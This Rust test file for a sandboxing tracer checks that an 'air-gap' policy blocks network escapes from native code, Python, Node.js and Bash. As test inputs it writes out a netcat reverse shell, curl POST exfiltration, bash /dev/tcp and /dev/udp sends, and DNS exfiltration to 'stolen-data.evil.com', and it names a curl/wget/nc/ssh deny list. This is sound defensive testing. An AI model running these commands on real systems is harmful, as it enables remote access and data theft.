//! Air-gap policy bypass tests.
//!
//! Attempts to break out of the air-gap policy using every available
//! runtime: native binary, Python, Node.js, and Bash.
//! Documents what the policy catches vs. what slips through.

use std::time::Duration;

use crate::common::*;
use crate::skip_if_no_bash_primary;
use crate::skip_if_no_node_primary;
use crate::skip_if_no_python_primary;

fn setup() {
    build_fixtures();
}

/// Use the named policy directly — --policy accepts embedded policy names.
const POLICY: &str = "air-gap";

/// A determined attacker tries every trick to exfiltrate data through
/// the air-gap. Uses native binary, Python, Node.js, and Bash — all
/// attempting outbound TCP connections.
///
/// The air-gap policy blocks at three active layers:
///   - Network deny (domains/endpoints/URLs) — catches reported targets
///   - Command deny (curl/wget/nc/ssh) — catches exec'd network tools
///   - Symbol deny (socket/connect/sendto/...) — catches C-level libc calls
///
/// Layers 1-3 catch runtime escape vectors (Python, Node.js, Bash all
/// funnel through libc). A future Layer 4 (direct syscall detection)
/// will catch inline-asm / shellcode that bypasses libc entirely.
#[test]
fn test_air_gap_bypass_attempts() {
    setup();

    // ── Vector 1: Native binary socket() — CAUGHT ──────────────────
    // malicious_target calls socket() + connect(127.0.0.1:4444).
    // The policy's symbol deny installs hooks automatically — no need
    // for a manual -s flag. The connect() is denied at the native level.
    {
        let target = fixture("malicious_target");
        if target.exists() {
            let output = run_tracer_with_timeout(
                &[
                    "x",
                    "-p",
                    POLICY,
                    "--",
                    target.to_str().unwrap(),
                    "/dev/null",
                    "127.0.0.1",
                    "4444",
                ],
                Duration::from_secs(10),
            );
            let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
            // The native connect() or socket() should be denied by the policy.
            assert!(
                stdout.contains("denied:"),
                "Native connect()/socket() should be denied.\nstdout:\n{}",
                stdout,
            );
        }
    }

    // ── Vector 2: curl command — CAUGHT ────────────────────────────
    // curl is explicitly in the command deny list.
    // Use Node.js to spawn curl (exec monitoring catches it).
    skip_if_no_node_primary!(node => {
        let js_code = "try{require('child_process').execSync('curl -s http://127.0.0.1:4444')}catch(e){}";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:") && stdout.contains("curl"),
            "curl should be denied by air-gap command policy.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Vector 3: Python socket — CAUGHT ────────────────────────────
    // Python's socket module calls libc socket()/connect() under the
    // hood. The symbol deny list catches these C-level calls via malwi-intercept.
    skip_if_no_python_primary!(python => {
        let py_code = "import socket\ns=socket.socket()\ns.settimeout(1)\ntry:\n s.connect(('127.0.0.1',4444))\nexcept: pass";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "Python socket.connect should be denied by symbol hooks.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Vector 4: Node.js net.connect — CAUGHT ──────────────────────
    // Node.js net.connect calls libc connect(). Symbol deny catches it.
    skip_if_no_node_primary!(node => {
        let js_code = "const s=require('net').connect({port:4444,host:'127.0.0.1',timeout:1000}); \
                       s.on('error',()=>{}); s.on('timeout',()=>s.destroy()); \
                       setTimeout(()=>process.exit(),2000)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "Node.js net.connect should be denied by symbol hooks.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Vector 5: Bash /dev/tcp — CAUGHT ────────────────────────────
    // Bash's /dev/tcp is a shell built-in that opens a raw TCP socket
    // without forking any external command. But it still calls libc
    // connect() internally, which the symbol deny list catches.
    skip_if_no_bash_primary!(bash => {
        let bash_code = "exec 3<>/dev/tcp/127.0.0.1/4444 2>/dev/null || true";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", bash.to_str().unwrap(), "-c", bash_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "Bash /dev/tcp should be denied by symbol hooks.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Vector 6: Direct syscall (inline asm) — NOT YET IMPLEMENTED ─
    // direct_syscall_target uses raw SVC/SYSCALL instructions to create
    // a socket without going through libc. This vector requires the
    // syscall monitor which is not yet implemented in malwi-hook.
    // TODO: Re-enable when syscall detection is re-implemented.
}

/// Exfiltration-specific vectors: attempts to smuggle data out through
/// DNS, HTTP POST, UDP, reverse shells, and tool-based exfil.
#[test]
fn test_air_gap_exfiltration_attempts() {
    setup();

    // ── Exfil 1: DNS exfiltration via Python ─────────────────────────
    // Encode stolen data as DNS subdomain labels. Caught by symbol deny
    // on getaddrinfo (all DNS resolution goes through it).
    skip_if_no_python_primary!(python => {
        let py_code = "import socket,time\ntry:\n socket.getaddrinfo('stolen-data.evil.com',80)\nexcept: pass\ntime.sleep(1)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "DNS exfil via Python getaddrinfo should be denied.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Exfil 2: HTTP POST via Python urllib ─────────────────────────
    // Classic data exfil via HTTP POST. Caught by symbol deny on
    // socket/connect (urllib uses libc sockets underneath).
    skip_if_no_python_primary!(python => {
        let py_code = "import urllib.request,time\ntry:\n urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:4444',data=b'stolen',method='POST'),timeout=1)\nexcept: pass\ntime.sleep(1)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "HTTP POST exfil via Python urllib should be denied.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Exfil 3: UDP fire-and-forget via Python ──────────────────────
    // UDP sendto() without connect() — fire-and-forget exfil.
    // Caught by symbol deny on sendto (or socket).
    skip_if_no_python_primary!(python => {
        let py_code = "import socket,time\ntry:\n s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n s.sendto(b'exfil',('127.0.0.1',4444))\nexcept: pass\ntime.sleep(1)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "UDP exfil via Python sendto should be denied.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Exfil 4: Node.js HTTP POST exfil ─────────────────────────────
    // http.request() to POST stolen data. Caught by symbol deny on
    // connect (Node.js HTTP uses libc sockets).
    skip_if_no_node_primary!(node => {
        let js_code = "\
            const http = require('http'); \
            const req = http.request({hostname:'127.0.0.1',port:4444,method:'POST',timeout:1000}, \
                ()=>process.exit()); \
            req.on('error',()=>process.exit()); \
            req.write('stolen-data'); \
            req.end(); \
            setTimeout(()=>process.exit(),2000)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "HTTP POST exfil via Node.js should be denied.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Exfil 5: Node.js DNS exfiltration ────────────────────────────
    // Encode data in DNS query via dns.resolve(). Caught by symbol
    // deny on getaddrinfo.
    skip_if_no_node_primary!(node => {
        let js_code = "\
            const dns = require('dns'); \
            dns.resolve('stolen-data.evil.com', ()=>process.exit()); \
            setTimeout(()=>process.exit(),2000)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", node.to_str().unwrap(), "-e", js_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "DNS exfil via Node.js dns.resolve should be denied.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Exfil 6: Python os.system reverse shell ──────────────────────
    // Spawn a reverse shell via os.system. Caught by command deny on nc.
    skip_if_no_python_primary!(python => {
        let py_code = "import os,time\nos.system('nc -e /bin/sh 127.0.0.1 4444 2>/dev/null || true')\ntime.sleep(1)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "Reverse shell via Python os.system(nc) should be denied.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Exfil 7: Python os.system curl POST ────────────────────────
    // Use os.system to curl POST stolen data. Caught by command deny.
    // (os.system uses /bin/sh -c → execve, reliably hooked.)
    skip_if_no_python_primary!(python => {
        let py_code = "import os,time\nos.system('curl -s -X POST -d secret=value http://127.0.0.1:4444 2>/dev/null || true')\ntime.sleep(1)";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", python.to_str().unwrap(), "-c", py_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:") && stdout.contains("curl"),
            "curl POST exfil via Python os.system should be denied.\nstdout:\n{}",
            stdout,
        );
    });

    // ── Exfil 8: Bash /dev/udp exfil ───────────────────────────────
    // Fire-and-forget UDP exfil via bash builtin /dev/udp.
    // Caught by symbol deny on socket/sendto (same mechanism as /dev/tcp).
    skip_if_no_bash_primary!(bash => {
        let bash_code = "echo stolen-data > /dev/udp/127.0.0.1/4444 2>/dev/null || true";
        let output = run_tracer_with_timeout(
            &["x", "-p", POLICY, "--", bash.to_str().unwrap(), "-c", bash_code],
            Duration::from_secs(10),
        );
        let stdout = strip_ansi_codes(&String::from_utf8_lossy(&output.stdout));
        assert!(
            stdout.contains("denied:"),
            "Bash /dev/udp exfil should be denied by symbol hooks.\nstdout:\n{}",
            stdout,
        );
    });
}
